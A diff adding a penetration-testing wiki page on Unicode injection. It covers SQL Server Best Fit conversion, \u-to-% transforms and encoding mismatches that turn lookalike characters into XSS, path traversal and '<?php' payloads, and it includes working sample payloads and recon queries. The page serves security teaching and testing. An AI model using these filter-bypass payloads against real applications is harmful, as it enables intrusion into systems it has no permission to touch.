@@ -1,0 +1,190 @@
+# Unicode Injection
+
+{{#include ../../banners/hacktricks-training.md}}
+
+## Introduction
+
+Depending on how the back-end/front-end behaves when it **receives weird Unicode characters**, an attacker might be able to **bypass protections and inject arbitrary ASCII metacharacters later**. The dangerous pattern is usually:
+
+1. Input is validated in one representation
+2. The application or database **implicitly converts / normalizes / re-encodes** it
+3. The converted value becomes dangerous **after** validation
+
+This can turn apparently harmless input into working payloads for **XSS, SQLi, path traversal/LFI, command injection, or logic bugs**.
+
+## Unicode normalization
+
+Unicode normalization occurs when **Unicode characters are normalized to ASCII characters** or to another compatible representation. One common scenario is when the system **modifies** the user input **after checking it**. For example, in some languages a simple call to make the **input uppercase or lowercase** could normalize the given input and the **Unicode will be transformed into ASCII** generating new characters.<sup>[[6]](#references)</sup>
+
+For more info check:
+
+{{#ref}}
+unicode-normalization.md
+{{#endref}}
+
+## SQL Server Best Fit / implicit conversion
+
+Microsoft SQL Server adds another dangerous post-validation transform: **implicit conversion from Unicode strings to narrow non-UTF code pages** (`char`, `varchar`, `text`, or non-Unicode string literals). Instead of rejecting unsupported characters, SQL Server can silently apply **Windows Best Fit mapping** and mutate Unicode lookalikes into ASCII metacharacters.<sup>[[1]](#references)[[2]](#references)</sup>
+
+### Dangerous conditions
+
+Look for combinations such as:
+
+- Columns using **`varchar` / `char` / `text`**
+- Non-UTF collations / code pages such as CP1252 (`iso_1` in metadata)
+- **Implicit conversion** from `nvarchar` to `varchar`
+- Dynamic SQL using **non-Unicode literals** like `'payload'` instead of `N'payload'`
+- Security-sensitive comparisons under **case-insensitive collations** such as `*_CI_*`
+
+Useful recon queries:
+
+```sql
+SELECT SERVERPROPERTY('Collation');
+SELECT DATABASEPROPERTYEX(DB_NAME(), 'Collation');
+
+SELECT
+    COLUMN_NAME,
+    DATA_TYPE,
+    CHARACTER_SET_NAME,
+    COLLATION_NAME
+FROM INFORMATION_SCHEMA.COLUMNS
+WHERE TABLE_NAME = 'target_table';
+```
+
+### Best Fit payload mutation
+
+Example: **FULLWIDTH LESS-THAN SIGN** `＜` (`U+FF1C`) can become ASCII `<` when inserted into a narrow column:
+
+```sql
+CREATE TABLE worstfit_demo (
+    narrow VARCHAR(20) COLLATE French_CI_AS,
+    wide   NVARCHAR(20) COLLATE French_CI_AS
+);
+
+INSERT INTO worstfit_demo VALUES (N'＜', N'＜');
+SELECT narrow, wide FROM worstfit_demo;
+-- narrow => <
+-- wide   => ＜
+```
+
+This is not Unicode normalization in the standard sense; it is **Windows code-page Best Fit conversion** during SQL Server storage/conversion.
+
+### Non-Unicode literal pitfall
+
+In SQL Server, `'text'` is a **non-Unicode literal by default**, even when inserted into an `NVARCHAR` column. Use the `N` prefix for wide strings:
+
+```sql
+INSERT INTO t VALUES ('＜');   -- converted before assignment
+INSERT INTO t VALUES (N'＜');  -- preserved in NVARCHAR, still mutated in VARCHAR
+```
+
+This matters in **stored procedures**, **dynamic SQL**, and any code path that concatenates attacker-controlled strings into SQL statements.
+
+### Stored XSS after DB storage
+
+If an application filters classic ASCII XSS but accepts Unicode lookalikes, SQL Server can convert them into a valid payload **after insertion**:
+
+```sql
+CREATE TABLE worstfitx (
+    vary VARCHAR(50) COLLATE French_CI_AS
+);
+
+INSERT INTO worstfitx VALUES (N'〈script〉alert(ʹxʹ)〈/script〉');
+SELECT vary FROM worstfitx;
+-- <script>alert('x')</script>
+```
+
+This is especially interesting when the app:
+
+- validates only before insert
+- stores the payload in MSSQL
+- later renders the **stored** value into HTML
+
+### Path traversal / LFI after DB storage
+
+If filenames are stored in narrow MSSQL columns and later reused to build filesystem paths, Unicode dots and slash/backslash lookalikes can turn into traversal sequences:
+
+```sql
+CREATE TABLE worstfity (
+    id SMALLINT,
+    file_name VARCHAR(50) COLLATE French_CI_AS
+);
+
+INSERT INTO worstfity
+VALUES (45, N'．．∖．．∖．．∖Windows∖win.ini');
+
+SELECT file_name FROM worstfity WHERE id = 45;
+-- ..\..\..\Windows\win.ini
+```
+
+The filter may only see the Unicode version, while the application later consumes the **mutated** Windows path from the database.
+
+### `?` fallback reconstruction
+
+When no Best Fit mapping exists, many Windows code pages fall back to `?`. This can reconstruct blocked syntax:
+
+```sql
+INSERT INTO worstfitx VALUES (N'<ʭphp');
+SELECT vary FROM worstfitx;
+-- <?php
+```
+
+Useful when `?` is blocked before storage but the DB later creates it.
+
+### Case-insensitive collation collisions
+
+Default SQL Server collations are often case-insensitive, so equality and pattern matching can collide:
+
+```sql
+SELECT IIF('abc' = 'ABC', 1, 0);      -- 1
+SELECT 'ok' WHERE 'abc' LIKE 'ABC';   -- ok
+```
+
+Don't assume usernames, API keys, role names, object IDs, or allow/deny-list checks are case-sensitive unless the relevant column/query uses a **binary or explicit case-sensitive collation**.
+
+### Offensive testing notes
+
+- Try **fullwidth**, **modifier**, and other compatibility-like characters for `<`, `>`, `'`, `"`, `/`, `\`, `.`, `-`, `?`
+- Compare **pre-insert** and **post-read** values, not only the reflected request
+- Check whether the app uses **`VARCHAR` metadata + Unicode client input**
+- Probe both `'payload'` and `N'payload'`
+- Audit logic bugs caused by `*_CI_*` collations in addition to injection sinks
+
+## `\u` to `%`
+
+Unicode characters are usually represented with the **`\u` prefix**. For example the char `㱋` is `\u3c4b` ([check it here](https://unicode-explorer.com/c/3c4B)). If a backend **transforms** the prefix **`\u` into `%`**, the resulting string will be `%3c4b`, which URL decoded is **`<4b`**. As you can see, a **`<` char is injected**.
+
+You could use this technique to **inject any kind of char** if the backend is vulnerable. Check [https://unicode-explorer.com/](https://unicode-explorer.com/) to find the chars you need.<sup>[[3]](#references)</sup>
+
+This vuln actually comes from a vulnerability a researcher found. For a more in-depth explanation check [https://www.youtube.com/watch?v=aUsAHb0E7Cg](https://www.youtube.com/watch?v=aUsAHb0E7Cg)<sup>[[4]](#references)</sup>
+
+## Emoji injection
+
+Back-ends sometimes behave weirdly when they **receive emojis**. That's what happened in [this writeup](https://medium.com/@fpatrik/how-i-found-an-xss-vulnerability-via-using-emojis-7ad72de49209) where the researcher managed to achieve XSS with a payload such as `img src=x onerror=alert(document.domain)//`.<sup>[[5]](#references)</sup>
+
+In that case, the server removed malicious characters and then **converted the UTF-8 string from Windows-1252 to UTF-8** (input/convert encoding mismatch). This did not immediately generate a proper `<`, just a weird Unicode quote-like character: `‹`.
+
+Then the output was **converted again from UTF-8 to ASCII**. This second conversion normalized `‹` into `<`, making the payload executable:
+
+```php
+<?php
+$a = "＜img src=x onerror=alert(document.domain)//";
+echo mb_convert_encoding($a, 'UTF-8', 'Windows-1252');
+# outputs: â€¹img src=x onerror=alert(document.domain)//
+
+# Then if the output is converted to ASCII:
+echo iconv('UTF-8', 'ASCII//TRANSLIT', mb_convert_encoding($a, 'UTF-8', 'Windows-1252'));
+# outputs: <img src=x onerror=alert(document.domain)//
+?>
+```
+
+## References
+
+- [1] [Synacktiv - The SQL Server Unicode problem: why your data might not be what you think it is?](https://synacktiv.com/en/publications/the-sql-server-unicode-problem-why-your-data-might-not-be-what-you-think-it-is.html)
+- [2] [Orange Tsai / DEVCORE - WorstFit: Unveiling Hidden Transformers in Windows ANSI!](https://devco.re/blog/2025/01/09/worstfit-unveiling-hidden-transformers-in-windows-ansi/)
+- [3] [Unicode Explorer](https://unicode-explorer.com/)
+- [4] [Abusing unicode characters to PWN Intigriti XSS challenge](https://www.youtube.com/watch?v=aUsAHb0E7Cg)
+- [5] [How I found an XSS vulnerability via using emojis](https://medium.com/@fpatrik/how-i-found-an-xss-vulnerability-via-using-emojis-7ad72de49209)
+- [6] [HackTricks - Unicode normalization](unicode-normalization.md)
+
+{{#include ../../banners/hacktricks-training.md}}
